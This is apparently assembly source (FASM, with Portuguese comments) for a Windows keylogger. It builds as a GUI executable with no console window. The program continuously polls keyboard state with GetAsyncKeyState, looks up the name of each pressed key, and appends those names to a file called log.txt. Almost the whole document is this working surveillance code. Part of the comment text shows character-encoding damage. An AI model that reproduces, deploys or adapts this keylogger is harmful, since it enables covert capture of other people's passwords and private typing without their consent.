format PE GUI 5.0
entry start  ; Ponto de partida

include 'win32a.inc' ; fun��es e constantes -> API do Windows

log db "log.txt",0  ; Arquivo de log
buffer db 0x100 dup (?) ; Buffer -> nome da tecla
bytes_escritos dd 0 ; vari�vel -> armazena n�mero de bytes escritos no arquivo


start:
mov esi,7  ; esi = 7; Ignorar caracteres especiais -> logar de BackSpace em diante
invoke Sleep,1; Pausa -> evitar 100% de uso
jmp gogo ; Lolz, come�a logar...

gogo:
cmp esi,255 ; Verifica se ESI = 255 -> �ltima tecla
je start ; Se for, pula para o in�cio onde o registrador receber� o valor inicial 7

inc esi ; Caso ainda n�o seja 255, incrementa o valor
invoke GetAsyncKeyState,esi ; Verifica se a tecla correspondente ao valor de ESI foi pressionada
cmp eax,0 ; Compara o valor de retorno (eax) com 0
jnz logar ; Se n�o for 0 = tecla pressionada -> logar tecla
jmp gogo  ; Retorna ao loop caso a tecla n�o seja pressionada

logar:
invoke MapVirtualKey,esi,0 ; Obt�m par�metros da tecla
shl eax,16  ; Desloca 16 bits para a esquerda (shift left) -> par�metro nome da tecla
invoke GetKeyNameText,eax,buffer,0x100 ; Obt�m o nome da tecla e armazena em "buffer"

; Tenta criar o arquivo ou abri-lo
invoke  CreateFile, log, GENERIC_WRITE, 0,  NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL
cmp eax,0 ; Verifica erro
je exit ; Encerra em caso de erro

; Como utilizaremos outras fun��es que alteram o valor do registrador EAX
; que atualmente possui o ponteiro para o arquivo criado acima, utilizamos o registrador EBX como backup
mov ebx,eax ; ebx = eax -> ponteiro para o arquivo

invoke SetFilePointer,ebx,0,0,FILE_END  ; Move posi��o de leitura/escrita para o final do arquivo

invoke lstrlen,buffer ; Obt�m tamanho em bytes do buffer ocupado -> retornado em EAX
invoke WriteFile,ebx,buffer,eax,bytes_escritos,NULL ; Escreve no arquivo o nome da tecla
invoke Sleep,100 ; Pausa entre a escrita no arquivo e o retorno � captura de teclas
invoke CloseHandle,ebx ; Fecha ponteiro para o arquivo
jmp gogo  ; Gogo de novo :)

exit:

invoke ExitProcess,0 ; Encerra


; Fun��es lolz

data import

  library kernel,'KERNEL32.DLL',\
          user,'USER32.DLL'

  import kernel,\
       Sleep,'Sleep',\
       CreateFile,'CreateFileA',\
       WriteFile,'WriteFile',\
       SetFilePointer,'SetFilePointer',\
       CloseHandle,'CloseHandle',\
       lstrlen,'lstrlenA',\
       ExitProcess,'ExitProcess'

  import user,\
         GetAsyncKeyState, 'GetAsyncKeyState',\
         MapVirtualKey,'MapVirtualKeyA',\
         GetKeyNameText,'GetKeyNameTextA'

end data